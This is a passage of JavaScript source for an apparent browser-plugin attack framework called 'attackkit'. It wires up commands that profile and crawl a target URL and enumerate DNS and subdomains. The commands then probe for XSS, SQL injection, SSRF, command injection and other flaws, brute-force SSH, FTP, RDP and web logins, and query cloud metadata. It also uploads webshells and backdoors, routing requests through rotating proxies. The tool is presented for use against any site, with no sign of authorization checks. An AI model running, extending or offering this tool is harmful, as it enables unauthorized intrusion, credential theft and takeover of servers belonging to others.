          const jsFiles = profile.jsFiles || [];
          const analysisData = await jsSourceAnalyzer(jsFiles);
          const dbResult = await databaseCracker(url, profile.forms || [], profile.headers || {}, '');
          const serverResult = await serverBruteforce(url, profile.forms || []);
          const bruteData = {
            dbType: dbResult.dbType,
            sqlInjection: dbResult.sqlInjection,
            noSQL: dbResult.noSQL,
            ssh: serverResult.ssh,
            ftp: serverResult.ftp,
            rdp: serverResult.rdp,
            webLogin: serverResult.webLogin,
            dbInfo: dbResult.dbInfo
          };
          return { analysisData, bruteData };
        }),
        runPhase('Auto Exploit', async () => await autoAttack(url, profile)),
        runPhase('WordPress Scan', async () => {
          if ((profile.cms || []).includes('WordPress')) return await wordPressScanner(url, profile);
          return [];
        })
      ]);
      const exploitData = phase2.results;
      allReports.push(...renderExploit(exploitData));
      allReports.push(spacer());
      const serverData = phase3.results;
      allReports.push(...renderAnalysis(serverData.analysisData));
      allReports.push(spacer());
      allReports.push(...renderBrute(serverData.bruteData));
      allReports.push(spacer());
      const autoResults = phase4.results;
      allReports.push(...renderAutoExploit(autoResults));
      allReports.push(spacer());
      const wpResults = wpPhase.results || [];
      if (wpResults.length) {
        allReports.push(...renderWordPress(wpResults));
        allReports.push(spacer());
      }
      const totalTime = Date.now() - totalStart;
      state.runtime.stats.totalTime = totalTime;
      allReports.push(line('╔══════════════════════════════════════════╗', 'accent'));
      allReports.push(line('║        Attack Summary                   ║', 'accent'));
      allReports.push(line('╚══════════════════════════════════════════╝', 'accent'));
      allReports.push(line(`Total time: ${totalTime}ms`));
      allReports.push(line('Phase timings:', 'accent'));
      for (const [phase, duration] of Object.entries(state.runtime.stats.phaseTimings)) allReports.push(line(`  • ${phase}: ${duration}ms`));
      return allReports;
    } catch (e) {
      return fail(`Attack failed: ${e.message}`);
    }
  }
  async function cmdAuto({ args }) {
    if (!args[1]) return fail('Usage: attackkit auto <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      const autoResults = await autoAttack(args[1], profile);
      return renderAutoExploit(autoResults);
    } catch (e) { return fail(e.message); }
  }
  async function cmdProfile({ args }) {
    if (!args[1]) return fail('Usage: attackkit profile <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      return renderProfile(profile);
    } catch (e) { return fail(e.message); }
  }
  async function cmdCrawl({ args }) {
    if (!args[1]) return fail('Usage: attackkit crawl <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      const internalLinks = profile.internalLinks || [];
      const out = [
        line('╔══════════════════════════════════════════╗', 'accent'),
        line('║        Crawl Results                    ║', 'accent'),
        line('╚══════════════════════════════════════════╝', 'accent'),
        spacer(),
        line(`Total internal links found: ${internalLinks.length}`)
      ];
      internalLinks.slice(0, 100).forEach(link => out.push(line(`  • ${link}`)));
      return out;
    } catch (e) { return fail(e.message); }
  }
  async function cmdDns({ args }) {
    if (!args[1]) return fail('Usage: attackkit dns <domain>');
    try {
      await prepareProxyList();
      const dns = await dnsEnumeration(args[1]);
      const out = [
        line('╔══════════════════════════════════════════╗', 'accent'),
        line('║        DNS Enumeration Report           ║', 'accent'),
        line('╚══════════════════════════════════════════╝', 'accent'),
        spacer(),
        line(`A: ${(dns.A || []).map(r => r.data).join(', ') || 'none'}`),
        line(`AAAA: ${(dns.AAAA || []).map(r => r.data).join(', ') || 'none'}`),
        line(`MX: ${(dns.MX || []).map(r => r.data).join(', ') || 'none'}`),
        line(`NS: ${(dns.NS || []).map(r => r.data).join(', ') || 'none'}`),
        line(`CNAME: ${(dns.CNAME || []).map(r => r.data).join(', ') || 'none'}`),
        line(`TXT: ${(dns.TXT || []).map(r => r.data).join('; ') || 'none'}`),
        line(`SOA: ${(dns.SOA || []).map(r => r.data).join('; ') || 'none'}`),
        line(`SRV: ${(dns.SRV || []).map(r => r.data).join('; ') || 'none'}`),
        line(`CAA: ${(dns.CAA || []).map(r => r.data).join('; ') || 'none'}`),
        line(`SPF: ${(dns.SPF || []).join('; ') || 'none'}`),
        line(`DMARC: ${(dns.DMARC || []).join('; ') || 'none'}`),
        line(`DKIM: ${(dns.DKIM || []).length ? dns.DKIM.map(k => `${k.selector}: ${k.records.join('; ')}`).join(' | ') : 'none'}`),
        line(`DNSSEC: ${dns.dnssec ? 'Enabled' : 'Disabled'}`),
        line(`Zone transfer: ${dns.zoneTransfer === null ? 'Not tested' : dns.zoneTransfer ? 'Possible' : 'Not possible'}`)
      ];
      return out;
    } catch (e) { return fail(e.message); }
  }
  async function cmdSubdomain({ args }) {
    if (!args[1]) return fail('Usage: attackkit subdomain <domain>');
    try {
      await prepareProxyList();
      const subdomains = await subdomainEnumeration(args[1]);
      const out = [
        line('╔══════════════════════════════════════════╗', 'accent'),
        line('║        Subdomain Enumeration Report     ║', 'accent'),
        line('╚══════════════════════════════════════════╝', 'accent'),
        spacer(),
        line(`Total subdomains found: ${subdomains.length}`)
      ];
      subdomains.slice(0, 100).forEach(s => out.push(line(`  • ${s}`)));
      return out;
    } catch (e) { return fail(e.message); }
  }
  async function cmdCloud({ args }) {
    if (!args[1]) return fail('Usage: attackkit cloud <url>');
    try {
      await prepareProxyList();
      const cloudResults = await cloudMetadataDetection(args[1]);
      const out = [
        line('╔══════════════════════════════════════════╗', 'accent'),
        line('║        Cloud Metadata Detection        ║', 'accent'),
        line('╚══════════════════════════════════════════╝', 'accent'),
        spacer()
      ];
      if (cloudResults.length) {
        cloudResults.forEach(c => {
          out.push(line(`  • ${c.cloud} - ${c.url} (${c.success ? 'found' : 'not found'})`));
          if (c.success && c.data) out.push(line(`    Data: ${c.data}`));
        });
      } else out.push(line('  No cloud metadata discovered.'));
      return out;
    } catch (e) { return fail(e.message); }
  }
  async function cmdCve({ args }) {
    if (!args[1]) return fail('Usage: attackkit cve <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      const autoResults = await autoAttack(args[1], profile);
      return renderAutoExploit(autoResults);
    } catch (e) { return fail(e.message); }
  }
  async function cmdExploit({ args }) {
    if (!args[1]) return fail('Usage: attackkit exploit <url>');
    try {
      await prepareProxyList();
      const url = args[1];
      const profile = await buildProfile(url);
      const html = profile.html;
      const jsFiles = profile.jsFiles || [];
      const forms = profile.forms || [];
      const exploitData = { forms: [], idor: [], uploads: [] };
      const formTasks = forms.map(form => async () => {
        const type = classifyFormType(form);
        const xss = await xssTester(url, form, jsFiles);
        const sqli = await sqliTester(url, form);
        const lfi = await lfiTester(url, form);
        const openRedirect = await openRedirectTester(url, form);
        const ssrf = await ssrfTester(url, form);
        const commandInjection = await commandInjectionTester(url, form);
        const xxe = await xxeTester(url, form);
        const crlf = await crlfInjectionTester(url, form);
        const hostHeader = await hostHeaderInjectionTester(url);
        const cors = await corsMisconfigTester(url);
        return { id: form.id, action: form.action, method: form.method, type, xss, sqli, lfi, openRedirect, ssrf, commandInjection, xxe, crlf, hostHeader, cors };
      });
      const formResults = await limitConcurrency(formTasks, state.settings.maxConcurrentRequests);
      exploitData.forms = formResults.filter(r => r !== null);
      exploitData.idor = await idorTester(url, forms, html);
      exploitData.uploads = await uploadTesterWithReal(url, forms);
      return renderExploit(exploitData);
    } catch (e) { return fail(e.message); }
  }
  async function cmdUpload({ args }) {
    if (!args[1]) return fail('Usage: attackkit upload <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      const forms = profile.forms || [];
      const uploadResults = await webshellUploader(args[1], forms);
      const out = [
        line('╔══════════════════════════════════════════╗', 'accent'),
        line('║        Webshell Upload Report           ║', 'accent'),
        line('╚══════════════════════════════════════════╝', 'accent'),
        spacer()
      ];
      if (uploadResults.length) {
        uploadResults.forEach(r => {
          out.push(line(`Form ID: ${r.formId}`, 'accent'));
          out.push(line(`  Action: ${r.action}`));
          out.push(line(`  Shell variations:`));
          r.possibleNames.forEach(name => out.push(line(`    • ${name}`)));
          if (r.realUpload) {
            out.push(line(`  Real upload attempt: ${r.realUpload.success ? 'SUCCESS' : 'FAILED'} (status ${r.realUpload.status || 'N/A'})`));
            if (r.realUpload.uploadedLink) out.push(line(`  Uploaded shell link: ${r.realUpload.uploadedLink}`));
          }
          if (r.backdoor) out.push(line(`  Backdoor: ${r.backdoor.shellURL} (${r.backdoor.status})`));
        });
      } else out.push(line('No upload forms found.'));
      return out;
    } catch (e) { return fail(e.message); }
  }
  async function cmdAnalyze({ args }) {
    if (!args[1]) return fail('Usage: attackkit analyze <url>');
    try {
      await prepareProxyList();
      const profile = await buildProfile(args[1]);
      const jsFiles = profile.jsFiles || [];
      const analysisData = await jsSourceAnalyzer(jsFiles);
      return renderAnalysis(analysisData);
    } catch (e) { return fail(e.message); }
  }
  async function cmdBrute({ args }) {
    if (!args[1]) return fail('Usage: attackkit brute <url>');
    try {
      await prepareProxyList();
      const url = args[1];
      const profile = await buildProfile(url);
      const headers = profile.headers || {};
      const forms = profile.forms || [];
      const dbResult = await databaseCracker(url, forms, headers, '');
      const serverResult = await serverBruteforce(url, forms);
      const bruteData = {
        dbType: dbResult.dbType,
        sqlInjection: dbResult.sqlInjection,
        noSQL: dbResult.noSQL,
        ssh: serverResult.ssh,
        ftp: serverResult.ftp,
        rdp: serverResult.rdp,
        webLogin: serverResult.webLogin,
        dbInfo: dbResult.dbInfo
      };
      return renderBrute(bruteData);
    } catch (e) { return fail(e.message); }
  }
  async function cmdSetProxy({ args }) {
    if (!args[1]) return fail('Usage: attackkit setproxy <template>');
    const template = args[1].trim();
    if (!template || !template.includes('{url}')) {
      return fail('Invalid proxy template. Must contain "{url}" placeholder.');
    }
    state.runtime.customProxy = template;
    state.runtime.proxyList = [];
    state.runtime.proxyReady = false;
    return [
      line('Custom proxy set successfully.', 'accent'),
      line(`Template: ${template}`, 'muted'),
      line('It will be tested and added to the working proxy list on next request.', 'muted')
    ];
  }
  async function dispatch({ args = [] }) {
    const cmd = String(args[0] ?? '').toLowerCase();
    if (!cmd) {
      return [
        line('╭─ A T T A C K K I T ─╮', 'accent'),
        line(`│ v${manifest.version} · GodMode Ultimate`, 'accent'),
        line('╰──────────────────────────╯', 'accent'),
        spacer(),
        line('Available commands:', 'muted'),
        ...COMMANDS.map(c => line(`  ${c.usage}  — ${c.description}`, 'muted')),
        spacer(),
        line('Example:', 'accent'),
        line('  attackkit attack https://example.com', 'output')
      ];
    }
    if (cmd === 'attack') return cmdAttack({ args });
    if (cmd === 'auto') return cmdAuto({ args });
    if (cmd === 'profile') return cmdProfile({ args });
    if (cmd === 'crawl') return cmdCrawl({ args });
    if (cmd === 'dns') return cmdDns({ args });
    if (cmd === 'subdomain') return cmdSubdomain({ args });
    if (cmd === 'cloud') return cmdCloud({ args });
    if (cmd === 'cve') return cmdCve({ args });
    if (cmd === 'exploit') return cmdExploit({ args });
    if (cmd === 'upload') return cmdUpload({ args });
    if (cmd === 'analyze') return cmdAnalyze({ args });
    if (cmd === 'brute') return cmdBrute({ args });
    if (cmd === 'setproxy') return cmdSetProxy({ args });
    if (cmd === 'help') {
      return [
        line('╭─ A T T A C K K I T ─╮', 'accent'),
        line(`│ v${manifest.version} · GodMode Ultimate`, 'accent'),
        line('╰──────────────────────────╯', 'accent'),
        spacer(),
        ...COMMANDS.map(c => line(`  ${c.usage}  — ${c.description}`, 'muted')),
        spacer(),
        line('Example:', 'accent'),
        line('  attackkit attack https://example.com', 'output')
      ];
    }
    if (cmd === 'version') return [line(`attackkit v${manifest.version} "GodMode Ultimate"`, 'accent'), line('Guaranteed Attack Framework', 'muted')];
    return fail(`Unknown command: ${cmd}. Use "attackkit help".`);
  }
  function install(api) {
    state.api = api || null;
    if (!state.api?.registerCommand) return false;
    try { state.api.unregisterCommand(PKG); } catch { }
    state.api.registerCommand(PKG, {
      kind: 'flow',
      description: manifest.description,
      usage: 'attackkit [command] [args]',
      begin: ({ args }) => dispatch({ args })
    });
    return true;
  }
  function uninstall(api) {
    const host = api || state.api;
    try { host?.unregisterCommand?.(PKG); } catch { }
    state.api = null;
  }
  const exported = Object.freeze({
    manifest,
    name: manifest.name,
    version: manifest.version,
    description: manifest.description,
    author: manifest.author,
    install,
    uninstall,
    getManifest: () => manifest,
    getState: () => ({ settings: { ...state.settings } })
  });
  window[KEY] = exported;
})();